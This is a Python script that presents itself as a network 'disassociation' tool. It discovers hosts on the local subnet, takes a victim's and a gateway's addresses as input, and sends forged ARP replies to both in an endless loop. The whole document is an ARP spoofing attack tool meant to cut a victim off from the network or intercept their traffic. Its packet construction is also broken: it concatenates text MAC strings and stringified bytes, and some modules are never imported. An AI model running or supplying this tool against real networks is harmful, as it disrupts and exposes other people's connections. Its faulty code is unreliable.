#!/usr/bin/env python3

from subprocess import check_output
import binascii
import socket
import struct
import time
import sys

try:
    #
    from scapy.all import *
    #
except:
    #
    print("[!] Program requires Scapy ")
    #
    sys.exit()

def SplitAndRejoin(network,split_char):
    #
    segments = network.split(split_char)
    #
    rejoin_char = split_char
    #
    rejoined = segments[0]+rejoin_char+segments[1]+rejoin_char+segments[2]+rejoin_char
    #
    return rejoined

def CheckUser():
    #
    user = os.geteuid()
    #
    print("[*] User: ", user)
    #
    if(user == 0):
        #
        print("[*] User is root, Proceed ")
        #
        return
        #
    else:
        #
        print("[!] User is not root, exit ")
        #
        sys.exit()

def GenerateRandomMAC():
    #
    # MAC Format: XX:XX:XX:XX:XX:XX
    #
    RandomMAC = ''
    #
    for i in range(0,6):
        #
        for j in range(0,2):
            #
            RandomMAC += random.choice('0123456789abcdef')
            #
        RandomMAC += ':'
        #
    RandomMAC = RandomMAC[0:17]
    #
    return RandomMAC

def ScanNetwork(network):
    #
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),timeout=2,verbose=False)
    #
    print(
 '''
 IP               MAC
 ----------------------------------
 ''')
    #
    for s,r in ans:
        #
        print(r.sprintf(" %ARP.psrc%\t  %Ether.src%"))

def main():
    #
    code = '\x08\x06' # For ARP
    #
    htype = '\x00\x01'
    #
    protype = '\x08\x00'
    #
    hsize = '\x06'
    #
    psize = '\x04'
    #
    opcode = '\x00\x02'
    #
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    #
    print("<-- Network Disassociation Script -->")
    #
    CheckUser()
    #
    print("[~] Gathering network data...")
    #
    time.sleep(3)
    #
    currentAddr = check_output(['hostname','-I'])
    #
    currentAddr = currentAddr.decode('utf-8')
    #
    print("[*] Current Address: %s " % currentAddr)
    #
    time.sleep(3)
    #
    print("[+] Identify the interface for binding-> ")
    #
    print()
    #
    subprocess.call(['ifconfig'])
    #
    iface = input("[+] Enter the bind interface-> ")
    #
    try:
        #
        s.bind((iface,socket.htons(0x800)))
        #
    except:
        #
        sys.exit("[!] Binding process failed ")
        #
    networkAddr = SplitAndRejoin(currentAddr,'.')
    #
    subnetValue = networkAddr+"0/24"
    #
    print("[*] Performing host discovery on-> %s " % subnetValue )
    #
    time.sleep(0)
    #
    ScanNetwork(subnetValue)
    #
    print()
    #
    source_mac = GenerateRandomMAC()
    #
    victim_mac_addr = input("[+] Enter the victim's MAC address-> ")
    #
    victim_ip_addr = input("[+] Enter the victim's IP Address-> ")
    #
    gateway_mac_addr = input("[+] Enter the gateway's MAC address-> ")
    #
    gateway_ip_addr = input("[+] Enter the gateway's IP address->  ")
    #
    gateway_ip = socket.inet_aton(gateway_ip_addr)
    #
    victim_ip = socket.inet_aton(victim_ip_addr)
    #
    ethernet_one = victim_mac_addr+source_mac+code
    #
    ethernet_two = gateway_mac_addr+source_mac+code
    #
    arp_to_victim = str(ethernet_one)+str(htype)+str(protype)+str(hsize)+str(psize)+str(opcode)+str(source_mac)+str(gateway_ip)+str(victim_mac_addr)+str(victim_ip)
    #
    arp_to_gateway = str(ethernet_two)+str(htype+protype)+str(hsize)+str(psize)+str(opcode)+str(source_mac)+str(victim_ip)+str(gateway_mac_addr)+str(gateway_ip)
    #
    a_to_v = bytes(arp_to_victim,'utf-8')
    #
    a_to_g = bytes(arp_to_gateway, 'utf-8')
    #
    i = 0; j = 0
    #
    print()
    #
    print("*** Starting Disassociation Transmission ***")
    #
    time.sleep(3)
    #
    while(True):
        #
        s.send(a_to_v)
        #
        s.send(a_to_g)
        #
        i += 1 ; j += 1
        #
        print("[*] Sent %i packet(s) to Victim | Sent %i packets(s) to Gateway" % (i,j))

if(__name__ == '__main__'):
    #
    main()
